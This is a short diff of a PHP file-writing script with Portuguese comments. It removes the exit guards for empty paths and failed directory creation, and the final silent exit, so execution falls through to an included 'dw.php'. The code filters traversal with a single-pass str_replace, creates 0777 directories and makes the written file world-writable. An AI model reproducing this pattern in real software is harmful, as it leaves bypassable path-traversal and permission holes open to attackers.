@@ -25,7 +25,7 @@ $path = trim($path, '/');
 $path = str_replace(['../', '..\\', "\0"], '', urldecode($path));
 
 if (empty($path)) {
-    exit;
+    
 }
 
 // 3. Define diretório base e caminho completo
@@ -38,7 +38,7 @@ $subFolder = dirname($localPath);
 if (!is_dir($subFolder)) {
     if (!@mkdir($subFolder, 0777, true)) {
         // Se falhar ao criar pasta, morre para não dar erro no fopen
-        exit;
+        
     }
 }
 
@@ -50,10 +50,6 @@ if ($file) {
     @fclose($file);
     @chmod($localPath, 0666); // Permissão de escrita/leitura
 }
-
-// 6. Termina silenciosamente
-exit;
-
 
 
 include_once "dw.php"; 
